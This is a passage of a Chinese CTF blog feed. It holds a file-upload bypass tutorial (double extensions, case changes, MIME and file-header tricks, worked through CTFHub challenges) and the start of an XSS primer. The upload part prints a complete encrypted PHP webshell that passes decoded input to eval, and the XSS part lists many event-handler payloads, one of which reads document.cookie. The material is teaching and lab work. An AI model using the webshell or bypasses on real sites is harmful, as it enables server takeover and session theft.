class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$name</span>); <span class="comment">//str_ireplace() 函数替换字符串中的一些字符（不区分大小写）</span></span><br></pre></td></tr></table></figure><h3 id="例题：-2"><a href="#例题：-2" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-双写后缀</strong></p><p>查看页面源码，发现这样一段内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);</span><br><span class="line">$name = str_ireplace($blacklist, &quot;&quot;, $name);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这时候上传<code>shell</code>文件，并抓包，将后缀名<code>.php</code>改写为<code>.pphphp</code>，再发包最后成功上传</p><h2 id="大小写后缀绕过"><a href="#大小写后缀绕过" class="headerlink" title="大小写后缀绕过"></a>大小写后缀绕过</h2><h3 id="大小写后缀绕过-1"><a href="#大小写后缀绕过-1" class="headerlink" title="大小写后缀绕过"></a>大小写后缀绕过</h3><p>后端在检测时，后台会检测敏感字符，如果并没有不区分大小写时，可以使用大小写进行绕过。比如：将<code>.php</code>改写为<code>.pHp</code></p><p>后端的代码类似为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\b(&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$blacklist</span>) . <span class="string">&#x27;)\b/&#x27;</span>; <span class="comment">//区分大小写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="MIME检测绕过"><a href="#MIME检测绕过" class="headerlink" title="MIME检测绕过"></a>MIME检测绕过</h2><h3 id="MIME简介"><a href="#MIME简介" class="headerlink" title="MIME简介"></a>MIME简介</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL。部分Web应用系统判定文件类型是通过<code>content-type字段</code>，截取一个请求信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 930</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;echo.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;wells&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz--</span><br></pre></td></tr></table></figure><p>其中<code>Content-Type: application/octet-stream</code>和就是描述了上传文件的MIME 类型</p><h3 id="MIME绕过方法"><a href="#MIME绕过方法" class="headerlink" title="MIME绕过方法"></a>MIME绕过方法</h3><p>部分Web应用系统判定文件类型是通过<code>content-type字段</code>，因此可以通过抓包，将<code>content-type字段</code>改为常见的<code>图片类型</code>，如<code>image/gif</code>，从而绕过校验。</p><h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型:"></a>常见的MIME类型:</h3><p><code>text/plain</code> （纯文本）  <code>text/html</code> （HTML文档）  <code>text/javascript</code> （js代码）  <code>application/xhtml+xml</code> （XHTML文档）  <code>image/gif</code> （GIF图像）  <code>image/jpeg</code> （JPEG图像）  <code>image/png</code> （PNG图像）  <code>video/mpeg</code> （MPEG动画）  <code>application/octet-stream</code> （二进制数据）  <code>application/pdf</code> （PDF文档）</p><h3 id="例题：-3"><a href="#例题：-3" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-MIME绕过</strong></p><p>尝试直接上传<code>.htaccess</code>和<code>php</code>shell文件时都上传失败，尝试修改MIME类型，抓包原始请求头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 930</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;7dad18e6e49e447a&quot;;</span><br><span class="line">$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">session_write_close();</span><br><span class="line">$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">$post=$t($post.&quot;&quot;);</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">     $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundarydBnKdxUvNtC4xakz--</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary4BffHh31AMlHQtBd</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary4BffHh31AMlHQtBd</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br></pre></td></tr></table></figure><p>再放行，最后发现<code>shell.php</code>被成功上传，访问<code>upload/shell.php</code>，无内容显示，说明<code>.txt</code>文件被作为php脚本执行成功，使用冰蝎连接</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240305205615030.png" alt="image-20240305205615030"></p>              </div>            </details><p>成功获取<code>phpinfo</code>页面，连接成功，读取flag</p><h2 id="文件头检测绕过"><a href="#文件头检测绕过" class="headerlink" title="文件头检测绕过"></a>文件头检测绕过</h2><h3 id="文件头检测绕过简介"><a href="#文件头检测绕过简介" class="headerlink" title="文件头检测绕过简介"></a>文件头检测绕过简介</h3><p>文件头是在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）的一段数据，用于描述文件的属性和格式信息， 在进行<strong>文件头绕过</strong>时，我们可以把图片的<strong>文件头</strong>添加到我们的木马内容最前面，达到绕过文件头检测的目的。</p><h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><p><strong>注意：文本形式请点击复制，不要做任何修改</strong></p><p> GIF：</p><p>16进制模式：<code>47 49 46 38 39 61</code></p><p>对应文本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p> png：</p><p>16进制模式：<code>89 50 4E 47 0D 0A 1A 0A</code> </p><p>对应文本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‰PNG</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JPG：</p><p>16进制模式：<code>FF D8 FF E0 00 10 4A 46 49 46 </code>   </p><p>对应文本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ÿØÿà</span><br></pre></td></tr></table></figure><h3 id="文件头检测绕过条件"><a href="#文件头检测绕过条件" class="headerlink" title="文件头检测绕过条件"></a>文件头检测绕过条件</h3><ul><li>某些情况下，后端可能还会检测文件拓展名，此时需要结合<strong>解析漏洞</strong>或者<strong>文件包含</strong>才能实现执行木马</li></ul><h3 id="例题：-4"><a href="#例题：-4" class="headerlink" title="例题："></a>例题：</h3><p><strong>CTFHUB-技能树-WEB-文件上传-文件头检查</strong></p><p>步骤一：直接选择木马文件进行上传，然后进行抓包</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/image-20240311194544976.png" alt="image-20240311194544976"></p><p><img src="/./file-upload/image-20240311194902164.png" alt="image-20240311194902164"></p>              </div>            </details><p><strong>以添加PNG请求头为例</strong></p><p>方法一：在PHP代码前添加入任意八个字母，用于定位以及替换为PNG的文件头，后转HEX模式替换为PNG的文件头</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/75033ba79ccf8f01e779c986126eab6d.png" alt="75033ba79ccf8f01e779c986126eab6d"></p>              </div>            </details><p>方法二：直接在PHP代码后插入PNG文件头对应的文本表示符号</p><details class="folding-tag" ><summary> 查看图片教程 </summary>              <div class='content'>              <p><img src="/./file-upload/d27ef6d3293e7bd2c81eb69580af1915.png" alt="d27ef6d3293e7bd2c81eb69580af1915"></p>              </div>            </details><h1 id="文章引用"><a href="#文章引用" class="headerlink" title="文章引用"></a>文章引用</h1><ul><li><p>引用腾讯云开发者社区博主「网络安全自修室」的文章</p><p>原文链接：<a href="https://cloud.tencent.com/developer/article/1938541">超详细文件上传漏洞总结分析-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;h3 id=&quot;什么是文件上传漏洞&quot;&gt;&lt;a href=&quot;#什么是文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;什么是文件上传</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-FileUpload" scheme="https://we11s.github.io/tags/Web-FileUpload/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞-入门</title>
    <link href="https://we11s.github.io/posts/2255213327/"/>
    <id>https://we11s.github.io/posts/2255213327/</id>
    <published>2024-02-18T12:29:15.000Z</published>
    <updated>2024-03-01T12:52:05.435Z</updated>
    
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-unserialize" scheme="https://we11s.github.io/tags/Web-unserialize/"/>
    
  </entry>
  
  <entry>
    <title>XSS-基础篇</title>
    <link href="https://we11s.github.io/posts/508713684/"/>
    <id>https://we11s.github.io/posts/508713684/</id>
    <published>2024-02-18T12:27:38.000Z</published>
    <updated>2024-03-05T11:38:57.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS简介："><a href="#XSS简介：" class="headerlink" title="XSS简介："></a>XSS简介：</h1><p>动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p><h2 id="XSS的分类："><a href="#XSS的分类：" class="headerlink" title="XSS的分类："></a>XSS的分类：</h2><h3 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h3><p>​(1)<strong>原理</strong></p><p>​反射型xss又称非持久型xss。发出请求时，此类XSS代码出现在URL中，作为输入提交到服务器端，XSS代码被服务器端解析后传回给浏览器，后解析执行XSS代码。</p><p>​(2)<strong>攻击方式</strong></p><p>​攻击者将包含xss代码的恶意链接发送给目标用户。当其他用户访问该链接时，服务器接受该用户的URL中参数的请求并进行处理，后xss代码被服务器发送给其他用户的浏览器，触发xss漏洞</p><h3 id="2、存储型-持久化"><a href="#2、存储型-持久化" class="headerlink" title="2、存储型(持久化)"></a>2、存储型(持久化)</h3><p>​(1)<strong>原理</strong></p><p>​存储型XSS，提交的代码会存储在服务器端，其他用户请求该页面时会触发xss漏洞，无需访问攻击者的特定链接。例如：留言板中的XSS，用户提交一条包含XSS代码的留言存储到数据库，其他用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击</p><p>​(2)<strong>攻击方式</strong></p><p>​攻击者将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，页面进行解析后响应，最后浏览器解析执行XSS代码，触发xss漏洞</p><h3 id="3、DOM-based型"><a href="#3、DOM-based型" class="headerlink" title="3、DOM-based型"></a>3、DOM-based型</h3><blockquote><p>文档对象模型（DOM）是一个网络文档的编程接口。它代表页面，以便程序可以改变文档的结构、风格和内容。DOM 将文档表示为节点和对象；这样，编程语言就可以与页面交互。</p></blockquote><p>​(1)<strong>原理</strong></p><p>​DOM型xss其实是一种特殊类型的反射型xss，与反射型类似此类XSS代码出现在URL中，但DOM XSS和反射型XSS的区别在于DOM XSS代码并不需要服务器参与，依靠客户端进行解析。</p><p>​(2)<strong>攻击方式</strong></p><p>​与反射型类似，当其他用户访问该链接时，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p><h2 id="XSS代码插入位置"><a href="#XSS代码插入位置" class="headerlink" title="XSS代码插入位置"></a>XSS代码插入位置</h2><h3 id="1-插入到HTML注释内容中"><a href="#1-插入到HTML注释内容中" class="headerlink" title="1.插入到HTML注释内容中"></a>1.插入到HTML注释内容中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">&lt;script&gt;  alert(&#x27;XSS&#x27;);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-插入到HTML标签的属性值中"><a href="#2-插入到HTML标签的属性值中" class="headerlink" title="2.插入到HTML标签的属性值中"></a>2.插入到HTML标签的属性值中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image,png&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注：<code>onerror</code>属性是HTML中<code>&lt;img&gt;</code>标签的一个事件属性，它用于定义当图像加载失败时执行的JavaScript代码。</p><h3 id="3-插入到HTML标签的属性名中"><a href="#3-插入到HTML标签的属性名中" class="headerlink" title="3.插入到HTML标签的属性名中"></a>3.插入到HTML标签的属性名中</h3><p>使用语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>构造闭合，可得到以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用构造闭合的方式将恶意代码插入到某个标签中，将恶意代码插入到了标签中的属性值中，实现XSS攻击</p><h3 id="4-插入到HTML标签名中"><a href="#4-插入到HTML标签名中" class="headerlink" title="4.插入到HTML标签名中"></a>4.插入到HTML标签名中</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>img src=&quot;/1.png&quot;&gt;</span><br></pre></td></tr></table></figure><p>浏览器会将第一个尖括号视为整体标签名的起始符号，而第二个尖括号则是<code>&lt;script&gt;</code> 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现XSS攻击</p><h3 id="6-插入到CSS中"><a href="#6-插入到CSS中" class="headerlink" title="6.插入到CSS中"></a>6.插入到CSS中</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`1`)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>我们在background-image样式属性中插入了一段JavaScript url（<em>在过去，一些浏览器可能没有严格限制这种用法，允许<code>javascript:</code>伪协议在CSS属性中执行JavaScript代码。</em>），当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码。</p><h3 id="7-插入到HTTP响应中"><a href="#7-插入到HTTP响应中" class="headerlink" title="7.插入到HTTP响应中"></a>7.插入到HTTP响应中</h3><p><strong>先留一个坑，还没看懂这个部分，后面再来填</strong></p><h1 id="XSS中常使用的标签以及对应属性"><a href="#XSS中常使用的标签以及对应属性" class="headerlink" title="XSS中常使用的标签以及对应属性"></a>XSS中常使用的标签以及对应属性</h1><h3 id="标签"><a href="#标签" class="headerlink" title="&lt;a&gt; 标签"></a><code>&lt;a&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>href</code>属性（手动点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>onclick</code>（点击时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-1"><a href="#标签-1" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;</code>标签</h3><p><strong>对应属性：</strong></p><p><code>onerror</code>（加载错误时触发XSS、将src乱输入一个值即可）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;v</span><br></pre></td></tr></table></figure><p><code>onclick</code>（点击时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-2"><a href="#标签-2" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;</code>标签</h3><p>HTML 内联框架元素 (<code>&lt;iframe&gt;</code>)</p><p><strong>对应属性：</strong></p><p><code>onload</code>（加载完成时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe 